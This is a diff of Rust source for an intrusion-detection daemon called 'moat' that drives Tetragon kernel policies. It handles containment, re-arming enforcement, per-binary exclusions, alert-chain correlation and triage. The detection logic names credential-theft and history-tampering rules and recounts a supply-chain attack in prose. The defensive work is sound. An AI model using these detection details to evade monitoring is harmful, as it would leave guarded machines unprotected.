+            "v": 1,
+            "ts": util::now_rfc3339(),
+            "chain": chain,
+            "severity": severity,
+            "families": families,
+            "verdict": verdict,
+            "reason": reason,
+            "mode": self.cfg.contain.kill,
+            "targets": targets,
+        });
+        let path = self.cfg.paths.state_dir.join("decisions.jsonl");
+        // Rotate before appending so the file cannot exceed the cap; one
+        // generation, like the alert store.
+        if std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0) >= 1024 * 1024 {
+            let _ = std::fs::rename(&path, path.with_extension("1.jsonl"));
+        }
+        use std::io::Write as _;
+        match std::fs::OpenOptions::new().create(true).append(true).open(&path) {
+            Ok(mut f) => {
+                let _ = writeln!(f, "{}", line);
+            }
+            Err(e) => log::warn!("decisions.jsonl: {}", e),
+        }
+    }
+
+    /// Which containment slot this chain should use.
+    ///
+    /// Reuses the slot this chain already holds (a chain that grows is
+    /// re-contained, not doubly contained); otherwise the lowest free slot;
+    /// otherwise the slot of the oldest live containment, which is released
+    /// first so `tp add` is not handed a name the kernel already has. That
+    /// eviction is the same one `Containments::insert` would do a moment
+    /// later -- doing it here just means the kernel and the record agree.
+    fn contain_slot_for(&mut self, chain: &str) -> usize {
+        let max = self.cfg.contain.max.max(1);
+        let slot_of = |c: &crate::contain::Containment| -> Option<usize> {
+            c.policy.rsplit('-').next().and_then(|n| n.parse::<usize>().ok())
+        };
+        let live = self.contain.live();
+        if let Some(s) = live.iter().find(|c| c.chain == chain).and_then(slot_of) {
+            return s;
+        }
+        let taken: Vec<usize> = live.iter().filter_map(slot_of).collect();
+        if let Some(free) = (0..max).find(|s| !taken.contains(s)) {
+            return free;
+        }
+        // Every slot is in use. The oldest goes, and its policy is deleted
+        // from the kernel before its name is reused.
+        let oldest = live.iter().min_by_key(|c| c.since).cloned();
+        match oldest {
+            Some(c) => {
+                let s = slot_of(&c).unwrap_or(0);
+                self.release_contain(&c);
+                s
+            }
+            None => 0,
+        }
+    }
+
+    /// already gone (tetragon restarted) is not an error, and a failure here
+    /// must not leave the record behind, or `moatctl release` would report
+    /// success on something it never removed.
+    fn release_contain(&mut self, c: &crate::contain::Containment) {
+        self.tetra_policy(&["tp", "delete", &c.policy]);
+        let path = self
+            .cfg
+            .paths
+            .runtime_dir
+            .join(format!("{}.yaml", c.policy));
+        let _ = std::fs::remove_file(&path);
+        log::info!("released containment {} ({})", c.policy, c.chain);
+    }
+
+    /// Expire what has run out. Called from the same tick as the baseline.
+    pub fn contain_tick(&mut self, now: u64) {
+        let gone = self.contain.expired(now);
+        if gone.is_empty() {
+            return;
+        }
+        for c in &gone {
+            self.release_contain(c);
+        }
+        self.write_state();
+    }
+
+    /// The policies whose kernel mode must be `enforce` right now.
+    ///
+    /// Pure, so the decision can be tested without a kernel: `run()` does the
+    /// applying.
+    pub fn enforcement_to_apply(&self) -> Vec<String> {
+        self.policies
+            .names()
+            .into_iter()
+            .filter(|n| self.mode_for(n) == "enforce")
+            .collect()
+    }
+
+    /// Push the armed set back into the kernel.
+    ///
+    /// `tetra tp set-mode` changes a LIVE policy, and that change dies with the
+    /// sensor. `enforcing_rules` and `mode` are restored from state.json on
+    /// startup, but until 2026-09-04 they were restored into MEMORY only -- so
+    /// after any tetragon restart (an update, a crash; moatd is `PartOf=` it and
+    /// restarts with it) every armed rule silently reverted to the `monitor` in
+    /// its policy file, while `status.enforcing_rules` and the panel both went
+    /// on saying ARMED. Enforcement that has quietly stopped, shown as running,
+    /// is the worst state this daemon can be in: the user believes a thing is
+    /// guarded and it is not.
+    ///
+    /// Called on every start, so the kernel and the record agree from the first
+    /// second rather than from the next time somebody touches a toggle.
+    pub fn reapply_enforcement(&mut self) -> (usize, usize) {
+        let want = self.enforcement_to_apply();
+        if want.is_empty() {
+            return (0, 0);
+        }
+        let (mut ok, mut failed) = (0usize, 0usize);
+        for name in &want {
+            if self.tetra_policy(&["tp", "set-mode", name, "enforce"]) {
+                ok += 1;
+            } else {
+                failed += 1;
+            }
+        }
+        if failed > 0 {
+            log::error!(
+                "re-arming after start: {} of {} policies did NOT take; the panel would \
+                 otherwise show them armed",
+                failed,
+                want.len()
+            );
+        } else {
+            log::info!("re-armed {} policy/policies in the kernel after start", ok);
+        }
+        (ok, failed)
+    }
+
+    /// Stop an ARMED policy watching one binary, in the kernel.
+    ///
+    /// This is what "allow this program" has to mean for a rule that enforces.
+    /// An allowlist entry is a userspace suppression and never reaches the
+    /// kernel, so allowing an armed rule used to hide the alert while the
+    /// process kept dying. The only thing that actually stops the killing is
+    /// taking the binary out of the policy, which means re-rendering it and
+    /// loading it again.
+    ///
+    /// Granularity is per BINARY, not per (binary, file): `matchBinaries` is
+    /// the only negative the kernel offers here, so excluding `cat` from the
+    /// shadow rule stops that rule watching `cat` for ALL of its paths. The
+    /// caller has to say so; silently granting more than was asked for is how
+    /// an allowlist becomes a hole.
+    pub fn exclude_binary(&mut self, rule: &str, exe: &str) -> Result<String, String> {
+        if !exe.starts_with('/') {
+            return Err(format!("{:?} is not an absolute path", exe));
+        }
+        if self.policies.meta_or_fallback(rule).enforce == "none" {
+            return Err(format!("{} does not enforce, so there is nothing to exclude", rule));
+        }
+        let list = self.kernel_exclusions.entry(rule.to_string()).or_default();
+        if !list.iter().any(|b| b == exe) {
+            list.push(exe.to_string());
+        }
+
+        // Re-render everything: it is 46 small files, and rendering only the
+        // one would need the template path, which the policy set does not keep.
+        let opts = crate::render::RenderOptions {
+            templates_dir: &self.cfg.paths.templates_dir,
+            out_dir: &self.cfg.paths.policies_dir,
+            export_allowlist: Some(&self.cfg.paths.export_allowlist),
+            passwd: &self.cfg.paths.passwd,
+            homes: None,
+            telemetry: self.cfg.telemetry.clone(),
+            exclusions: self.kernel_exclusions.clone(),
+        contain_slots: self.cfg.contain.max,
+        };
+        crate::render::render(&opts).map_err(|e| format!("render: {}", e))?;
+
+        // Replace the live policy. `tp add` will not overwrite, so the old one
+        // is deleted first -- a gap of milliseconds, and the alternative is an
+        // exclusion that does not take effect until the next reboot.
+        let path = self.rendered_path(rule)?;
+        self.tetra_policy(&["tp", "delete", rule]);
+        if !self.tetra_policy(&["tp", "add", &path]) {
+            return Err(format!(
+                "{} could not be reloaded; run `sudo systemctl restart tetragon` to \
+                 put it back",
+                rule
+            ));
+        }
+        // A fresh load starts in the mode its FILE declares, which is monitor.
+        // Re-arm it or the exclusion would silently disarm the whole rule.
+        // `mode_for`, not `enforcing_rules.contains`: a daemon-wide enforce
+        // arms every policy without listing any of them, and testing the list
+        // here left a rule silently in monitor after every exclusion while
+        // `status` went on saying enforce.
+        if self.mode_for(rule) == "enforce" {
+            self.tetra_policy(&["tp", "set-mode", rule, "enforce"]);
+        }
+        self.policies = crate::policy::PolicySet::load(&self.cfg.paths.policies_dir);
+        self.write_state();
+        Ok(path)
+    }
+
+    /// Take a kernel exclusion back.
+    ///
+    /// The counterpart to `exclude_binary`, and not optional: a grant that
+    /// cannot be revoked is not a grant, it is a hole with a nice name. Same
+    /// mechanics -- re-render, reload, re-arm -- because the exclusion lives in
+    /// the policy text and nothing else can remove it.
+    ///
+    /// Unlike granting one, this does NOT need root: it makes Moat watch more,
+    /// and the rule everywhere else in this daemon is that weakening protection
+    /// needs privilege while restoring it does not.
+    pub fn remove_exclusion(&mut self, rule: &str, exe: &str) -> Result<String, String> {
+        let gone = match self.kernel_exclusions.get_mut(rule) {
+            Some(list) => {
+                let before = list.len();
+                list.retain(|b| b != exe);
+                let removed = list.len() != before;
+                if list.is_empty() {
+                    self.kernel_exclusions.remove(rule);
+                }
+                removed
+            }
+            None => false,
+        };
+        if !gone {
+            return Err(format!("{} was not excluded from {}", exe, rule));
+        }
+
+        let opts = crate::render::RenderOptions {
+            templates_dir: &self.cfg.paths.templates_dir,
+            out_dir: &self.cfg.paths.policies_dir,
+            export_allowlist: Some(&self.cfg.paths.export_allowlist),
+            passwd: &self.cfg.paths.passwd,
+            homes: None,
+            telemetry: self.cfg.telemetry.clone(),
+            exclusions: self.kernel_exclusions.clone(),
+        contain_slots: self.cfg.contain.max,
+        };
+        crate::render::render(&opts).map_err(|e| format!("render: {}", e))?;
+
+        let path = self.rendered_path(rule)?;
+        self.tetra_policy(&["tp", "delete", rule]);
+        if !self.tetra_policy(&["tp", "add", &path]) {
+            return Err(format!(
+                "{} could not be reloaded; run `sudo systemctl restart tetragon` to put \
+                 it back",
+                rule
+            ));
+        }
+        if self.mode_for(rule) == "enforce" {
+            self.tetra_policy(&["tp", "set-mode", rule, "enforce"]);
+        }
+        self.policies = crate::policy::PolicySet::load(&self.cfg.paths.policies_dir);
+        self.write_state();
+        log::warn!("{} is watched again by {}", exe, rule);
+        Ok(path)
+    }
+
+    /// Where a policy's rendered YAML lives.
+    fn rendered_path(&self, rule: &str) -> Result<String, String> {
+        let dir = &self.cfg.paths.policies_dir;
+        let rd = std::fs::read_dir(dir).map_err(|e| format!("{}: {}", dir.display(), e))?;
+        for entry in rd.flatten() {
+            let p = entry.path();
+            if p.extension().map(|e| e != "yaml" && e != "yml").unwrap_or(true) {
+                continue;
+            }
+            if let Ok(text) = std::fs::read_to_string(&p) {
+                if text.contains(&format!("name: {}", rule)) {
+                    return Ok(p.display().to_string());
+                }
+            }
+        }
+        Err(format!("no rendered policy for {}", rule))
+    }
+
+    /// Release everything, for the switch going off.
+    pub fn release_all_contained(&mut self) -> usize {
+        let all: Vec<crate::contain::Containment> = self.contain.live().to_vec();
+        for c in &all {
+            self.release_contain(c);
+            self.contain.release(&c.chain);
+        }
+        self.write_state();
+        all.len()
+    }
+
+    /// Drop one now, by chain id.
+    pub fn release_chain(&mut self, chain: &str) -> bool {
+        let Some(c) = self.contain.release(chain) else {
+            return false;
+        };
+        self.release_contain(&c);
+        self.write_state();
+        true
+    }
+
+    fn tetra_policy(&self, args: &[&str]) -> bool {
+        match std::process::Command::new(&self.cfg.paths.tetra)
+            .args(args)
+            .output()
+        {
+            Ok(o) if o.status.success() => true,
+            Ok(o) => {
+                log::error!(
+                    "tetra {}: {}",
+                    args.join(" "),
+                    String::from_utf8_lossy(&o.stderr).trim()
+                );
+                false
+            }
+            Err(e) => {
+                log::error!("tetra {}: {}", args.join(" "), e);
+                false
+            }
+        }
+    }
+
+    /// Is `path` inside one of moat's own directories?
+    fn is_own_store(&self, path: &str) -> bool {
+        let roots = [
+            self.cfg.paths.state_dir.to_string_lossy().into_owned(),
+            "/var/log/moat".to_string(),
+        ];
+        util::under_any(path, &roots)
+    }
+
+    /// The rules that can be armed, with what arming one does.
+    fn enforceable(&self) -> Vec<serde_json::Value> {
+        let mut out: Vec<serde_json::Value> = self
+            .policies
+            .names()
+            .into_iter()
+            .filter_map(|name| {
+                let meta = self.policies.meta_or_fallback(&name);
+                if meta.enforce != "kill" && meta.enforce != "deny" {
+                    return None;
+                }
+                Some(json!({
+                    "rule": name,
+                    "enforce": meta.enforce,
+                    "title": meta.title,
+                    "severity": meta.severity,
+                    // What the KERNEL is doing for this rule, which is what the
+                    // switch on the Rules tab claims to show. Under a daemon-wide
+                    // enforce every one of these kills, and `enforcing_rules`
+                    // lists none of them.
+                    "armed": self.mode_for(&name) == "enforce",
+                }))
+            })
+            .collect();
+        out.sort_by(|a, b| a["rule"].as_str().cmp(&b["rule"].as_str()));
+        out
+    }
+
+    /// Does this history file belong to a real account? Human homes, plus
+    /// root's -- not a "human home" by CONTRACT §2, but a trail worth covering.
+    fn is_real_history(&self, path: &str) -> bool {
+        util::under_any(path, &self.homes) || path.starts_with("/root/")
+    }
+
+    /// Does an ENABLED userland rule produce the findings for this policy id?
+    ///
+    /// Enabled matters: a rule switched off in config must not silence the
+    /// kernel's own finding as well, or turning a rule off would turn its
+    /// policy into pure overhead that reports nothing.
+    fn rule_owns(&self, policy: &str) -> bool {
+        if policy.is_empty() {
+            return false;
+        }
+        self.rules.iter().any(|r| r.id() == policy && r.enabled(&self.cfg))
+    }
+
     fn policy_finding(&self, hook: &HookHit, exec_id: &str, _now: u64) -> Option<Finding> {
         let name = hook.policy_name();
         if !name.starts_with("moat-") {
             return None;
         }
         let proc = self.table.get(exec_id)?.clone();
-        let path = hook.file_path();
+        // The kernel's own string, kept for the re-validation below: `validate`
+        // asks whether the event still matches the selectors the kernel matched
+        // on, so it has to see what the kernel saw.
+        let raw_path = hook.file_path();
+        // The path a person would recognise. A no-op for every `path`-typed
+        // argument and on every non-btrfs machine; only a bare `dentry` needs
+        // it, because a dentry carries no mount and resolves no further than
+        // its own filesystem root (util::dentry_abs).
+        let path = raw_path
+            .as_deref()
+            .map(|p| util::dentry_abs(p, &self.subvols));
         let hook_name = hook.hook_name();
 
         // Never alert on our own reads. Taking an incident snapshot means
@@ -440,9 +1553,47 @@ impl Daemon {
             }
         }
 
+        // moat's own evidence store is not a place credentials get stolen from.
+        //
+        // Staging an incident copies the file the alert names into
+        // /var/lib/moat/incidents/<id>/file/<name>. That copy is a
+        // credential-shaped file in a directory the user can read, so the next
+        // recursive search walks into it, reads it, and raises a fresh
+        // `moat-cred-*` alert -- which stages another copy, which is fresh bait
+        // for the next scan. On 2026-09-04 that loop was half of every
+        // browser-secret alert on this machine (15 of 30) with 10 staged
+        // copies, and the newest incident directory was named by an alert about
+        // reading the previous one.
+        //
+        // This is the path-side twin of the `proc.pid` guard above: that one
+        // stops moat alerting on what it READS, this one stops it alerting on
+        // what is read FROM it. Rules whose subject is this directory are
+        // exempt, so a tamper rule still sees a deletion here.
+        if let Some(p) = path.as_deref() {
+            if self.is_own_store(p) && !SELF_WATCH_RULES.contains(&name) {
+                return None;
+            }
+        }
+
+        // A history file is only a history file if it is somebody's. The
+        // kernel matches this rule by name alone (`Postfix /.bash_history`),
+        // because a selector cannot ask whose home a path is in -- that answer
+        // is in /etc/passwd, which the kernel cannot read. So it fires on that
+        // name anywhere on the filesystem: on 2026-09-04 moat's own test suite
+        // tripped it when `rm -rf` removed a sandbox tempdir containing a
+        // throwaway $HOME, and because this rule is in the `rootkit` family
+        // that turned an ordinary build into a HIGH chain.
+        //
+        // The signal here is that a real record of what was typed is gone.
+        // Erasing a history file that is nobody's history erases no trail, so
+        // the cut is exactly "is this in a real account's home".
+        if name == HISTORY_TAMPER && !self.is_real_history(path.as_deref()?) {
+            return None;
+        }
+
         if let Err(m) = self
             .policies
-            .validate(name, &hook_name, path.as_deref(), &proc.exe)
+            .validate(name, &hook_name, raw_path.as_deref(), &proc.exe)
         {
             return Some(self.mismatch_finding(*m, exec_id, proc, path));
         }
@@ -458,9 +1609,53 @@ impl Daemon {
         // armed individually even while the daemon stays in monitor.
         f.mode = self.mode_for(name);
         f.kill_expected = hook.action_is_kill();
+        // Tetragon reports the CONFIGURED action in monitor mode too (NOTES
+        // §7 says so for Sigkill, and Override is the same field). The kill
+        // path waits for process_exit to prove it; a refusal has no such
+        // event, so the only honest gate is whether the kernel policy for
+        // this rule was enforcing. Without it, every monitor-mode deny policy
+        // recorded `action_taken: blocked` beside `mode: monitor` and told the
+        // user a connection had been refused that went straight through.
+        let configured_deny = hook.action_is_deny();
+        f.denied = configured_deny && f.mode == "enforce";
+        if f.denied {
+            f.extra_evidence.push(
+                "the kernel refused this operation: it returned EPERM to the program, which is \
+                 still running and will have seen the call fail"
+                    .to_string(),
+            );
+        } else if configured_deny {
+            f.extra_evidence.push(
+                "the policy is configured to refuse this, but it was in monitor mode: the \
+                 operation went ahead and was only reported"
+                    .to_string(),
+            );
+        }
 
         if let Some(path) = path {
             f.hook_detail = access_word(hook.int_arg());
+            // A setuid bit an unprivileged user sets on a file that user
+            // already owns grants nothing.
+            //
+            // setuid means "run as the file's OWNER". When the owner is the
+            // uid already running, that is the identity it has; the bit
+            // confers no privilege. This is the semantics of the bit, not a
+            // fact about any build tool -- which matters, because the shape it
+            // removes is every source build on this machine: `makepkg ->
+            // fakeroot -> debugedit` chmodding a staged `chrome-sandbox` under
+            // the user's own ~/.cache as uid 1000. That one step is what
+            // pushed ordinary package updates to critical, through the
+            // `priv + 2 families` rung in `chain::escalate`.
+            //
+            // The genuinely privileged moment -- pacman installing that file
+            // 4755 and root-owned into /opt -- is a different event with a
+            // different owner, and this leaves it alone.
+            if is_setuid_rule(name) {
+                if let Some(reason) = setuid_grants_nothing(&f, &path) {
+                    f.meta.severity = "low".to_string();
+                    f.extra_evidence.push(reason);
+                }
+            }
             f.file = Some(crate::alert::FileRef { path, sha256: None });
         } else if let Some((ip, port)) = hook.dest() {
             f.net = Some(crate::alert::NetRef {
@@ -492,7 +1687,7 @@ impl Daemon {
         if let Some(action) = &hook.ev.action {
             f.extra_evidence.push(format!(
                 "policy action: {} (mode {}; a kill is only recorded once process_exit reports SIGKILL)",
-                action, self.mode
+                action, f.mode
             ));
         }
         Some(f)
@@ -559,6 +1754,14 @@ impl Daemon {
     pub fn emit(&mut self, mut f: Finding) -> Option<String> {
         let now = util::unix_secs();
 
+        // --- 0. the mode that governed THIS rule ---------------------------
+        // Stamped here, once, for every finding whatever path built it. The
+        // policy path already did this; the userland rules (`RuleCtx::finding`)
+        // wrote the daemon-wide mode instead, so `moat-net-first-contact` --
+        // which is both a policy and a userland rule -- recorded `mode:
+        // monitor` on the alert while `status.enforcing_rules` listed it.
+        f.mode = self.mode_for(&f.rule);
+
         // --- 1. who acted, and from where (BASELINE §1 and §2b) -------------
         f.actor = self.provenance.classify_proc(&f.proc);
         f.context = context::classify(&self.table, &f.exec_id);
@@ -614,7 +1817,12 @@ impl Daemon {
         }
 
         // --- 5. the noise guard's demotion is not a suppression -------------
-        f.demoted = self.baseline.is_demoted(&f.rule);
+        // Demotion is scoped to the tuple that was noisy, not the whole rule
+        // (BASELINE §4): a rule silenced by this machine's own builds must not
+        // also silence a shape of it that nobody has ever seen.
+        f.demoted = self
+            .baseline
+            .is_demoted_tuple(&f.rule, &noise_tuple(&f));
 
         // --- 6. the receipt sees it too (LEARNING §3) -----------------------
         // Suppressed findings included: the write still happened, and a receipt
@@ -712,6 +1920,10 @@ impl Daemon {
                 log::error!("alerts.jsonl: {}", e);
             }
         }
+        // Correlation runs on the record, after it exists, because a chain is
+        // written back onto every member — including members that were already
+        // on disk before this one made the sequence visible.
+        self.note_chain(&f, &alert, now);
         if alert.is_suppressed() {
             self.alerts_suppressed += 1;
         } else {
@@ -746,11 +1958,192 @@ impl Daemon {
         // A suppressed alert is not noise the user can see, so it does not
         // count towards a demotion.
         if f.suppressed_by.is_none() {
-            if let Some(d) = self.baseline.note_alert(&f.rule, now) {
+            if let Some(d) = self.baseline.note_alert(&f.rule, &noise_tuple(&f), now) {
+                self.quieten_backlog(&d);
                 self.raise_noisy_rule(&d, now);
             }
         }
         Some(id)
+    }
+
+    /// BASELINE §4's retroactive half, done by the one party that knows the
+    /// demotion's real scope.
+    ///
+    /// "Stop asking me about this" has to cover what is already on the badge,
+    /// not only what comes next. Until now that was the PANEL's job: it read
+    /// `status.demoted_rules` and timelined every alert of every listed rule.
+    /// But that list is the one a person wants -- a rule with a single noisy
+    /// pattern is on it -- while a demotion here is per pattern, and the chain
+    /// correlator re-surfaces a demoted rule's step on purpose when a sequence
+    /// reaches `high`. So the panel silenced things this daemon had
+    /// deliberately surfaced: on 2026-09-05 a 64-step `makepkg` chain raised
+    /// to `high` read "expected" on every screen because its rules were on
+    /// the list. Restamping the covered backlog HERE, per pattern, means the
+    /// panel can read `surface` and nothing else.
+    ///
+    /// Only alerts the demotion actually covers move: unacked, on the badge,
+    /// this rule, and -- for a pattern demotion -- this pattern. A trigger
+    /// step of a chain that reached `high` is left alone: the correlator put
+    /// it back on the badge knowing the rule was noisy, and the noise guard
+    /// does not get to undo correlation.
+    fn quieten_backlog(&mut self, d: &Demotion) {
+        let high = crate::alert::severity_rank("high");
+        let mut moved = 0usize;
+        for a in self.store.load() {
+            if a.rule != d.rule || a.acked || a.surface != "alerts" {
+                continue;
+            }
+            if !d.tuple.is_empty() && a.tuple_key() != d.tuple {
+                continue;
+            }
+            let raised_by_chain = a.chain.as_ref().map_or(false, |c| {
+                crate::alert::severity_rank(&c.severity) >= high
+                    && c.steps.iter().any(|s| s.alert == a.id && s.is_trigger())
+            });
+            if raised_by_chain {
+                continue;
+            }
+            let u = UpdateLine::new(&a.id).set("surface", Value::from("timeline"));
+            if let Err(e) = self.store.append_update(&u) {
+                log::error!("alerts.jsonl: {}", e);
+                return;
+            }
+            moved += 1;
+        }
+        if moved > 0 {
+            log::info!(
+                "noise guard: {} earlier alert(s) of {} moved to the timeline with the demotion",
+                moved,
+                d.rule
+            );
+        }
+    }
+
+    /// Offer a freshly written alert to the chain correlator, and write the
+    /// resulting sequence back onto every alert in it (design 2b, 3a).
+    ///
+    /// Only whole alerts get here — a dedupe fold is the same event again, and
+    /// a story is about different events. That also keeps the write cost tied
+    /// to the number of distinct alerts rather than to a burst's volume.
+    ///
+    /// Each member carries the entire chain, rather than a pointer to a head
+    /// record, so a reader that has folded `alerts.jsonl` can draw 2b from
+    /// whichever alert the user opened without a second lookup. The cost is
+    /// that a growing chain rewrites itself onto its members; `ChainStore::note`
+    /// only hands one back when the story on disk actually changed, which caps
+    /// that at roughly `MAX_STEPS` (12) republishes of at most `MAX_STEPS` lines
+    /// each — a few hundred kB against a 20 MB rotation, however many
+    /// detections one tree trips.
+    fn note_chain(&mut self, f: &Finding, alert: &Alert, now: u64) {
+        let lineage: Vec<chain::LineageNode> = std::iter::once(&f.proc)
+            .chain(f.ancestry.iter())
+            .map(|p| chain::LineageNode {
+                exec_id: p.exec_id.clone(),
+                pid: p.pid,
+                exe: p.exe.clone(),
+                sid: p.sid,
+            })
+            .collect();
+        let Some(c) = self.chains.note(chain::Observation {
+            alert: alert.id.clone(),
+            ts: alert.ts.clone(),
+            at: now,
+            family: alert.family.clone(),
+            rule: alert.rule.clone(),
+            severity: alert.severity.clone(),
+            title: alert.title.clone(),
+            rarity: alert.rarity,
+            // "Silenced" means *someone decided this specific thing is fine*:
+            // the user's own allowlist entry, or the noise guard having watched
+            // this exact tuple fire all day. Both are on the finding already.
+            //
+            // It deliberately does NOT read `alert.surface`. That was the bug
+            // behind the 2026-09-04 20:41 miss: `scoring::surface_for` is a
+            // pure function of severity — medium and low are *always*
+            // `timeline` — so testing it here silently reimposed a `high` floor
+            // on every trigger, on top of the documented `medium` one, and a
+            // chain of two mediums could never form. A rule that is weak on its
+            // own is the whole reason this module exists; it is the prime
+            // candidate for a sequence, not a thing to discount.
+            // ONLY the user's own allowlist silences a step.
+            //
+            // A noise-guard demotion used to count here too, and it is a
+            // different kind of statement: the allowlist is the user saying
+            // "this event is fine", while the guard is moat's own arithmetic
+            // about how OFTEN a rule fires on this machine. Frequency is not
+            // consent, and correlation exists precisely because events that are
+            // ordinary alone are not ordinary together -- so letting the volume
+            // heuristic veto a step meant any rule that ever got noisy became
+            // permanently unable to contribute to a sequence.
+            //
+            // On 2026-09-04 that hid a live AUR attack: `makepkg` egressed to a
+            // host outside the registry and executed a dropped binary from
+            // /tmp, and the /tmp exec -- `high`, `first_seen`, the strongest
+            // signal in the whole run -- was demoted rule-wide because the
+            // user's own `cargo test` trips the same rule. It joined the chain
+            // as context, the remaining triggers were `low`/`medium`, and the
+            // chain came out `medium` with nothing on the badge.
+            silenced: f.suppressed_by.is_some(),
+            lineage,
+        }) else {
+            return;
+        };
+        log::warn!(
+            "chain {} {} ({} steps, {}): {}",
+            c.id,
+            c.severity,
+            c.steps_total,
+            c.severity_reason,
+            c.summary
+        );
+        let value = match serde_json::to_value(&c) {
+            Ok(v) => v,
+            Err(e) => {
+                log::error!("chain {}: {}", c.id, e);
+                return;
+            }
+        };
+        // A chain that reaches `high` has to be able to reach the BADGE.
+        //
+        // `surface` is stamped per alert, by a rule that only ever saw one
+        // event, so a chain whose members are each on the timeline stayed
+        // invisible no matter what the correlation concluded. On 2026-09-04 an
+        // AUR build egressed to a host outside the registry and ran a dropped
+        // binary from /tmp; every member was `timeline` because the noise guard
+        // had demoted those rules, and the user saw nothing at all.
+        //
+        // Only trigger steps are restamped. A context step is one the USER
+        // allowlisted, and a sequence is not a licence to go back on that --
+        // it still shows in the story, it just does not start shouting.
+        let raise = crate::alert::severity_rank(&c.severity)
+            >= crate::alert::severity_rank("high");
+        let triggers: std::collections::HashSet<&str> = c
+            .steps
+            .iter()
+            .filter(|s| s.is_trigger())
+            .map(|s| s.alert.as_str())
+            .collect();
+
+        self.maybe_contain(&c, now);
+        self.maybe_kill_tree(&c, now);
+        if crate::alert::severity_rank(&c.severity) >= crate::alert::severity_rank("high") {
+            // Content analysis first: quarantine moves the file into moat's own
+            // store, which the analyser refuses to read, so the order is not a
+            // preference.
+            self.analyse_chain_artifacts(&c);
+            self.quarantine_chain_artifacts(&c);
+        }
+
+        for member in c.member_ids() {
+            let mut u = UpdateLine::new(&member).set("chain", value.clone());
+            if raise && triggers.contains(member.as_str()) {
+                u = u.set("surface", Value::from("alerts"));
+            }
+            if let Err(e) = self.store.append_update(&u) {
+                log::error!("alerts.jsonl: {}", e);
+                return;
+            }
+        }
     }
 
     /// Which of the four rarity tuples this finding is about. An alert with no
@@ -789,10 +2182,93 @@ impl Daemon {
         }
     }
 
+    /// Copy an existing benign verdict onto un-triaged alerts of the same tuple,
+    /// and return how many were filled in (LEARNING §2c).
+    ///
+    /// The cheap half of the cost problem. An agent call is 1.5-3.5 minutes and
+    /// a paid request; a tuple that re-fires a hundred times is a hundred of
+    /// them for one question that was answered the first time.
+    ///
+    /// What it deliberately does not do is demote. An inherited verdict shows
+    /// the same explanation and leaves the alert exactly where it was, because
+    /// acting on a verdict nobody gave about *this* event would be the model
+    /// silencing a whole tuple off one read -- the thing `decide`'s ceiling
+    /// exists to prevent. Waste is worth fixing; silence is not worth buying.
+    pub fn inherit_triage_by_tuple(&mut self) -> usize {
+        let alerts = self.store.load();
+        // Newest benign verdict per tuple, with the rarity it was read at.
+        let mut source: std::collections::HashMap<String, (&crate::alert::Alert, &crate::triage::Triage)> =
+            std::collections::HashMap::new();
+        for a in &alerts {
+            let Some(t) = a.triage.as_ref() else { continue };
+            if t.result.verdict != crate::triage::Verdict::Benign {
+                continue;
+            }
+            // Never inherit from a record that was itself inherited: one real
+            // read must not become an unbounded chain of copies.
+            if t.outcome.starts_with("inherited:") {
+                continue;
+            }
+            let key = a.tuple_key();
+            match source.get(&key) {
+                Some((prev, _)) if prev.ts >= a.ts => {}
+                _ => {
+                    source.insert(key, (a, t));
+                }
+            }
+        }
+        if source.is_empty() {
+            return 0;
+        }
+        let now = crate::util::now_rfc3339();
+        let mut todo = Vec::new();
+        for a in &alerts {
+            if a.acked || a.triage.is_some() || a.surface != "alerts" {
+                continue;
+            }
+            let Some((src, prior)) = source.get(&a.tuple_key()) else { continue };
+            if src.id == a.id {
+                continue;
+            }
+            if !crate::triage::may_inherit(
+                prior,
+                &src.ts,
+                &now,
+                src.rarity.as_str(),
+                a.rarity.as_str(),
+            ) {
+                continue;
+            }
+            todo.push((
+                a.id.clone(),
+                crate::triage::record_inherited(prior, &src.id, &now),
+            ));
+        }
+        let mut done = 0usize;
+        for (id, record) in todo {
+            let value = serde_json::to_value(&record).unwrap_or(serde_json::Value::Null);
+            if self.mark(&id, "triage", value).is_ok() {
+                done += 1;
+            }
+        }
+        if done > 0 {
+            log::info!("triage: {} alert(s) inherited an existing verdict", done);
+        }
+        done
+    }
+
     /// Feed the (rule, actor exe, parent exe, file dir) tuple to the baseline,
     /// and act on what it decides (BASELINE §3).
     fn note_baseline(&mut self, f: &Finding, now: u64) {
         let severity = f.severity().to_string();
+        // What the rule itself decided, before the context matrix escalated it.
+        // The baseline gates on this (BASELINE §3): escalation is a statement
+        // about circumstances, and circumstances are what a baseline is for.
+        let severity_base = f
+            .score
+            .as_ref()
+            .map(|s| s.severity_base.clone())
+            .unwrap_or_else(|| severity.clone());
         let parent = f.parent_exe();
         let dir = f.file_dir();
         let rarity = f
@@ -806,6 +2282,7 @@ impl Daemon {
             parent: &parent,
             dir: &dir,
             severity: &severity,
+            severity_base: &severity_base,
             provenance: f.actor.provenance.as_str(),
             package: f.actor.package.clone(),
             context: f.context.as_str(),
@@ -1003,7 +2480,9 @@ impl Daemon {
             title: &f.meta.title,
             ts: &util::now_rfc3339(),
             context: f.context.as_str(),
-            mode: &self.mode,
+            // The alert's own mode, not the daemon's: meta.json sits beside a
+            // record that says `mode: enforce` and must not say monitor.
+            mode: &f.mode,
             pid: f.proc.pid,
             exe: &f.proc.exe,
             args: &f.proc.args,
@@ -1016,11 +2495,29 @@ impl Daemon {
         });
         // Retention is cheapest right after a capture, and it means the cap is
         // enforced even on a machine that never restarts the daemon.
+        // Which incidents still want a human. An alert that has been acked, or
+        // that the daemon never surfaced, is answered; those go first.
+        let keep: std::collections::HashSet<String> = self
+            .store
+            .load()
+            .iter()
+            .filter(|a| !a.acked && a.surface == "alerts")
+            // `dir` is the incident directory; its last component is the id
+            // that `prune` works in.
+            .filter_map(|a| {
+                a.incident.as_ref().and_then(|i| {
+                    std::path::Path::new(&i.dir)
+                        .file_name()
+                        .map(|n| n.to_string_lossy().to_string())
+                })
+            })
+            .collect();
         for gone in incident::prune(
             &dir,
             self.cfg.incidents.retain_days,
             self.cfg.incidents.retain_max,
             util::unix_secs(),
+            &keep,
         ) {
             log::info!("incident retention: removed {}", gone);
         }
@@ -1078,10 +2575,12 @@ impl Daemon {
         // bundle lives in. evidence.rs decides what may be copied; a cred
         // rule's target never is.
         let _ = std::fs::create_dir_all(&dir);
-        let artifacts = crate::evidence::stage(&alert, &dir, crate::evidence::MAX_STAGED_BYTES);
+        let artifacts = crate::evidence::stage(&alert, &dir, crate::evidence::MAX_STAGED_BYTES, &self.cfg.group);
         let body = bundle::render(&bundle::Input {
             alert: &alert,
-            mode: &self.mode,
+            // The table the agent reads is about `alert`; every other cell in
